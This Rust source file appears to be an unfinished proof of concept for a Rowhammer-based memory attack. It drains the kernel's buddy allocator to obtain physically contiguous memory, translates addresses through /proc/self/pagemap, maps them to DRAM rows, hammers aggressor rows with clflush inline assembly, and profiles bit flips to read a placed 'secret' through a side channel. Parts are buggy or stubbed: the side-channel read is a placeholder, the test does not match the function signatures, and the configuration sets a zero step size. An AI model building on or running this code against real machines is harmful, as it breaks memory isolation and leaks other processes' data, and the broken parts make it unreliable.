#![feature(try_trait)]
#![feature(asm)]

use std::os::raw::c_void;
use vm_info::page_map::read_page_map;
use vm_info::ProcessId::SelfPid;
use vm_info::page_size;
use proc_getter::buddyinfo::*;
use nix::sys::mman::{mmap, munmap, PROT_READ, PROT_WRITE, MAP_PRIVATE, MAP_POPULATE, MAP_ANONYMOUS};
use std::ptr::null_mut;
use std::{fs, io, slice};
use byteorder::ReadBytesExt;
use std::io::Seek;
use std::ops::{BitAnd, Range, Deref, DerefMut, Add};
use bitvec::bits::AsBits;
use bitvec::order::Lsb0;
use std::collections::HashMap;

mod architecture;

use crate::architecture::{PhysAddr, DramAddr, Architecture, IntelIvy};
use std::option::NoneError;
use crate::Direction::{From0To1, From1To0};
use std::iter::Map;
use std::slice::from_raw_parts_mut;
use std::cmp::min;
use std::borrow::Borrow;

const SIZE_MB: usize = 1 << 20;
const READ_MULTIPLICATOR: usize = 2;

struct Config {
    pub aligned_bits: usize,
    pub reads_per_refresh: usize,
    pub contiguous_dram_addr: usize,
    pub arch : Box<dyn Architecture>,
}

enum Direction {
    From1To0,
    From0To1,
}

struct Flip {
    dir: Direction,
    offset: usize,
    bit: u8,
}

#[derive(Clone)]
struct RawMem {
    pub buf: *mut u8,
    pub len: usize,
    pub range_map: HashMap<(u8, u8, u8, u8, u16), Vec<DramRange>>,
}

impl Deref for RawMem {
    type Target = [u8];

    fn deref(&self) -> &[u8] {
        unsafe { slice::from_raw_parts(self.buf, self.len) }
    }
}

impl DerefMut for RawMem {
    fn deref_mut(&mut self) -> &mut [u8] {
        unsafe { slice::from_raw_parts_mut(self.buf, self.len) }
    }
}


// assumes mem is aligned to contiguous address range
fn split_into_ranges(mem: *mut u8, len: usize, c: &Config) -> Vec<DramRange> {
    let mut ranges = Vec::new();
    for i in (0..len).step_by(c.contiguous_dram_addr) {
        ranges.push(DramRange {
            start: offset_to_dram(i, c),
            bytes: min(len - i, c.contiguous_dram_addr),
        });
    }

    ranges
}

impl RawMem {
    fn new(buf: *mut u8, len: usize, c: &Config) -> Self {
        RawMem { buf, len, range_map: to_range_map(buf, len, c) }
    }
}

// place the secret at buf + offset by unmapping part of buf
fn place_secret(buf: &mut RawMem, offset: usize, c: &Config) -> Result<(), NoneError> {
    // place the secret at buf + offset by unmapping part of buf
    // POC here
    buf[offset] = 0xff;
    let dram_secret = offset_to_dram(offset, c);

    // remove address from the row
    let row_ranges = same_row_ranges(buf, dram_secret.clone())?;
    let mut row_ranges_new = Vec::new();
    for r in row_ranges {
        let start_offset = dram_to_offset(&r.start.clone(), c);
        if start_offset < offset && offset >= start_offset + r.bytes {
            row_ranges_new.push(r.clone());
        } else {
            let r1 = DramRange { start: r.start.clone(), bytes: start_offset - offset };
            if r1.bytes > 0 {
                row_ranges_new.push(r1);
            }
            let r2 = DramRange {
                start: offset_to_dram(offset + 1, c),
                bytes: r.bytes - (start_offset - offset) - 1,
            };
            if r2.bytes > 0 {
                row_ranges_new.push(r2);
            }
        }
    }

    buf.range_map.insert(dram_secret.to_row_index(),
                         row_ranges_new);
    Ok(())
}

fn same_row_ranges(buf: &RawMem, da: DramAddr) -> Option<&Vec<DramRange>> {
    buf.range_map.get(&da.to_row_index())
}

// find an address in the row as buf + offset that is mapped in buf
fn same_row_addr(buf: &RawMem, offset: usize, c: &Config) -> Option<usize> {
    let offset_aligned = offset - offset % page_size().unwrap_or(4096);
    let mut da = offset_to_dram(offset, c);
    let ranges = same_row_ranges(buf, da)?;
    if ranges.is_empty() {
        None
    } else {
        Some(dram_to_offset(&ranges[0].start, c))
    }
}

fn hammer(a1: *const u8, a2: *const u8, c: &Config) {
    for _ in 0..c.reads_per_refresh * READ_MULTIPLICATOR {
        unsafe {
            asm!("
            mov (%0), %eax,
            mov (%1), %eax,
            clflush (%0),
            clflush (%1)" : :"r"(a1), "r"(a2) :  "eax"  : "volatile");
        }
    }
}

fn read_sidechannel(buf: &RawMem, flip: Flip, c: &Config) -> Option<bool> {
    let flip_byte = buf[flip.offset];
    let flip_bit = flip_byte & (1 << flip.bit) != 0;
    // hammering makes the vulnerable bit equal its neighbors
    Some(flip_bit)
}

unsafe fn fill_victim(buf: &mut RawMem, flip: Flip, c: &Config) {
    buf[flip.offset] = match flip.dir {
        From0To1 => 0,
        From1To0 => std::u8::MAX,
    };
}

// buf is 2MB-aligned
fn bool_exploit_flip(buf: &mut RawMem, flip: Flip, c: &Config) -> Option<bool> {
    let secret_above = offset_above(buf, flip.offset, c)?;
    let secret_below = offset_below(buf, flip.offset, c)?;
    place_secret(buf, align_page_offset(secret_above), c)?;
    place_secret(buf, align_page_offset(secret_below), c)?;
    let aggressor_above = same_row_addr(buf, secret_above, c)?;
    let aggressor_below = same_row_addr(buf, secret_below, c)?;

    //Fill flip address according to flip.dir

    buf[flip.offset] = match flip.dir {
        From0To1 => 0x0,
        From1To0 => 0xff,
    };

    hammer(&buf[aggressor_above],
           &buf[aggressor_below],
           c);

    read_sidechannel(buf, flip, c)
}

fn align_page_offset(offset: usize) -> usize {
    let page_size = page_size().unwrap_or(4096);
    offset - offset % page_size
}

fn virt_to_phys_aligned(addr: usize, aligned_bits: usize) -> usize {
    addr % (2usize.pow(aligned_bits as u32))
}

fn offset_to_dram(offset: usize, c: &Config) -> DramAddr {
    let phys = virt_to_phys_aligned(offset, c.aligned_bits);
    c.arch.phys_to_dram(offset)
}

fn dram_to_offset(dram_addr: &DramAddr, c: &Config) -> usize {
    c.arch.dram_to_phys(dram_addr)
}

// return offset of the address in the row above buf + offset
fn offset_above(buf: &RawMem, offset: usize, c: &Config) -> Option<usize> {
    let mut dram_addr = offset_to_dram(offset, c);
    if dram_addr.row == 0 {
        return None;
    }
    dram_addr.row -= 1;
    Some(dram_to_offset(&dram_addr, c))
}

// return offset of the address in the row below buf + offset
fn offset_below(buf: &RawMem, offset: usize, c: &Config) -> Option<usize> {
    let mut dram_addr = offset_to_dram(offset, c);
    // TODO: return None if dram_addr.row = c.MAX_ROW?
    //if dram_addr.row == unimplemented!() {
    //    return None
    //}
    dram_addr.row += 1;
    Some(dram_to_offset(&dram_addr, c))
}

fn virt_to_phys(v: *const u8) -> Option<PhysAddr> {
    let v = v as usize;
    let page_size = page_size().unwrap_or(4096);
    let page_num = v / page_size;

    let vpage = read_page_map(SelfPid, page_num)
        .ok()?;
    let frame = vpage.page_frame()?;
    Some(frame as usize * page_size)
}

fn vpage_to_page(virtual_page_num: usize) -> Option<usize> {
    let path = String::from("/proc/self/pagemap");

    let mut f = fs::File::open(path).ok()?;
    // Each entry is 8 bytes wide
    let offset = virtual_page_num as u64 * 8;
    f.seek(io::SeekFrom::Start(offset)).ok()?;

    let data = f.read_u64::<byteorder::NativeEndian>().ok()?;

    Some(data as usize)
}

fn sum_frees() -> usize {
    let bis = buddyinfo().unwrap();
    let mut sum: usize = 0;

    for (i, num) in bis[1].page_nums().iter().enumerate() {
        //println!("There are {} free things in slot {}", num, i);
        sum += num.clone() << i;
    }
    for (i, num) in bis[2].page_nums().iter().enumerate() {
        //println!("There are {} free things in slot {}", num, i);
        sum += num.clone() << i;
    }
    sum * page_size().unwrap_or(4096)
}

fn map_eager(sz: usize) -> Option<(*mut u8, usize)> {
    let mem: *mut c_void = mmap(
        null_mut(),
        sz,
        PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE,
        -1,
        0).ok()?;
    Some((mem as *mut u8, sz))
}

fn alloc_2mb_contig(c: &Config) -> Option<RawMem> {
    let alloc_sz = sum_frees() - SIZE_MB;

    println!("Bytes in Buddy-allocator {}\n", alloc_sz);
    let mut mem_buddy_rest = map_eager(alloc_sz)?;

    println!("Bytes in Buddy-allocator {}\n", sum_frees());
    let mut mem_buddy_rest_2mb = map_eager(2 * SIZE_MB)?;
    println!("Bytes in Buddy-allocator {}\n", sum_frees());
    let mem_attack = map_eager(2 * SIZE_MB)?;
    munmap(mem_buddy_rest.0 as *mut _, alloc_sz).unwrap();
    munmap(mem_buddy_rest_2mb.0 as *mut _, 2 * SIZE_MB).unwrap();
    Some(RawMem::new(mem_attack.0, mem_attack.1, c))
}

fn contig_mem_diff(c: &Config) {
    let mem_attack = alloc_2mb_contig(c).unwrap();
    let start_p = virt_to_phys(&mem_attack[0]).unwrap();
    let end_p = virt_to_phys(&mem_attack[2 * SIZE_MB - 1]).unwrap();
    assert_eq!(start_p + 2 * SIZE_MB - 1, end_p)
}

#[derive(Clone)]
struct DramRange {
    pub start: DramAddr,
    pub bytes: usize,
}


fn fill_ranges(mem: &RawMem, rs: &Vec<DramRange>, p: u8, c: &Config) {
    for r in rs {
        let t = 3;
        let x = &t;
        t as *const i32;
        let v_addr = mem.buf.wrapping_add(dram_to_offset(&r.start, c));
        let mut v_arr = unsafe { std::slice::from_raw_parts_mut(v_addr as *mut u8, r.bytes) };
        for b in v_arr { *b = p }
    }
}

fn dram_to_virt(base: *const u8, addr: &DramAddr, c: &Config) -> *const u8 {
    base.wrapping_add(dram_to_offset(addr, c))
}

fn find_flips(offset: usize, mut expected: u8, mut actual: u8) -> Vec<Flip> {
    let mut flips = Vec::new();
    for bit in 0..8 {
        if expected & 1 != actual & 1 {
            let dir = if expected & 1 == 1 {
                From1To0
            } else {
                From0To1
            };
            flips.push(Flip { dir, bit, offset })
        }
        expected >>= 1;
        actual >>= 1;
    }
    flips
}

fn profile_ranges(mem: &RawMem,
                  r1: &Vec<DramRange>,
                  r2: &Vec<DramRange>,
                  v: &Vec<DramRange>,
                  p: u8,
                  c: &Config) -> Vec<Flip> {
    fill_ranges(mem, r1, p, c);
    fill_ranges(mem, r2, p, c);
    let a1 = dram_to_virt(mem.buf, &r1[0].start, c);
    let a2 = dram_to_virt(mem.buf, &r2[0].start, c);

    hammer(a1, a2, c);

    let mut flips = Vec::new();
    for v_range in v {
        for (i, &b) in mem.iter().enumerate() {
            if b != p {
                flips.append(find_flips(i + dram_to_offset(&v_range.start, c), p, b).as_mut());
            }
        }
    }
    flips
}

fn to_range_map(mem: *mut u8, len: usize, c: &Config) -> HashMap<(u8, u8, u8, u8, u16), Vec<DramRange>> {
    // build a Map<(channel, rank, bank, row)> -> Vec<ranges>
    let mut range_map = HashMap::<(u8, u8, u8, u8, u16), Vec<DramRange>>::new();
    for r in split_into_ranges(mem, len, c) {
        let addr = &r.start;
        range_map.entry((addr.chan, addr.dimm, addr.rank, addr.bank, addr.row))
            .or_insert_with(Vec::new)
            .push(r);
    }
    range_map
}

fn template_2mb_contig(mem: &mut RawMem, c: &Config) -> Vec<Flip> {
    let mut flips = vec![];
    // iterate over map, hammer
    for ((chan, dimm,rank, bank, row), rs) in mem.range_map.iter() {
        let row_above = match mem.range_map.get(&(*chan, *dimm, *rank, *bank, *row - 1)) {
            Some(r) => r,
            None => continue,
        };
        let row_below = match mem.range_map.get(&(*chan, *dimm,*rank, *bank, *row + 1)) {
            Some(r) => r,
            None => continue,
        };

        flips.append(profile_ranges(mem, row_above, row_below, rs, 0x00, c).as_mut());
        flips.append(profile_ranges(mem, row_above, row_below, rs, 0xff, c).as_mut());
    }

    flips
}

#[cfg(test)]
#[test]
fn test_contig_mem_diff() {
    let mem_attack = alloc_2mb_contig().unwrap();
    println!("Allocated memory successfully at {:?}", mem_attack);
    let start_p = virt_to_phys(mem_attack).unwrap();
    let end_p = virt_to_phys(unsafe { mem_attack.add(2 * SIZE_MB - 1) }).unwrap();
    assert_eq!(start_p + 2 * SIZE_MB - 1, end_p)
}

fn main() {
    let c: Config = Config{
        aligned_bits: 20,
        reads_per_refresh: 100,
        contiguous_dram_addr: 0,
        arch: Box::new(IntelIvy {
            dual_channel: false,
            dual_dimm: false,
            dual_rank: true
        }) };
    contig_mem_diff(&c);
}
